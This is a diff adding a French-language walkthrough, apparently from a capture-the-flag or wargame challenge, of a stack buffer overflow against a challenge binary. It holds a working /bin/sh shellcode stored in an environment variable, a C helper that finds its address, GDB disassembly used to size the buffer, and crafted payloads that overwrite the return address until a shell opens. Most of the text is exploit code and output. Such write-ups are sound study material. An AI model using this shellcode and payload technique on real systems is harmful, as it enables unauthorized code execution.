@@ -1,0 +1,57 @@
+On va faire la meme chose qu'avant, c'est a dire passer notre shellcode dans l'environement puis l'executer:
+$ export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+On recupere l'adresse de SHELLCODE:
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char **argv)
+{
+	char *ptr;
+	ptr = getenv(argv[1]);
+	if( ptr == NULL )
+		printf("%s not found\n", argv[1]);
+	else
+		printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
+	return 0;
+}
+$ gcc -o getaddr getaddr.c
+$ /tmp/gbourgeo/getaddr SHELLCODE
+SHELLCODE found at bffffd4e
+$
+
+Creeons un fichier test pour pouvoir au moins aller dans read_file
+$ echo -n $(python -c 'print "\xff\xff\xff\xff" + "/"') > /tmp/gbourgeo/file_error
+
+OK. Un petit coup de GDB pour connaitre la taille allouer a path[] reellement:
+$ gdb ch11
+gdb$ b read_file
+gdb$ r /tmp/gbourgeo/file_error
+gdb$ disas
+...
+   0x0804853a <+5>:	sub    esp,0xa0
+=> 0x08048540 <+11>:	lea    edx,[ebp-0x89]
+   0x08048546 <+17>:	mov    ebx,0x81
+...
+
+On sait maintenant que le systeme va allouer 0x89 octets soit 137 en decimal a path[].
+Lets go:
+$ echo -n $(python -c 'print "\xff\xff\xff\xff" + "/"*141 + "\x4e\xfd\xff\xbf"') > /tmp/gbourgeo/file
+blabla
+SEGFAULT
+$
+
+Ah... souci.
+bon ba on enleve 4 a "/" puis on multiplie l'adresse de SHELLCODE 2 fois
+$ echo -n $(python -c 'print "\xff\xff\xff\xff" + "/"*137 + "\x4e\xfd\xff\xbf"*2') > /tmp/gbourgeo/file
+blabla
+SEGFAULT
+$
+
+Oh... il me manquerait pas de respect lui !
+On enleve 8 a "/" puis on multiplie l'adresse de SHELLCODE 3 fois
+$ echo -n $(python -c 'print "\xff\xff\xff\xff" + "/"*133 + "\x4e\xfd\xff\xbf"*3') > /tmp/gbourgeo/file
+sh-4.2$
+
+ET BIM !
+
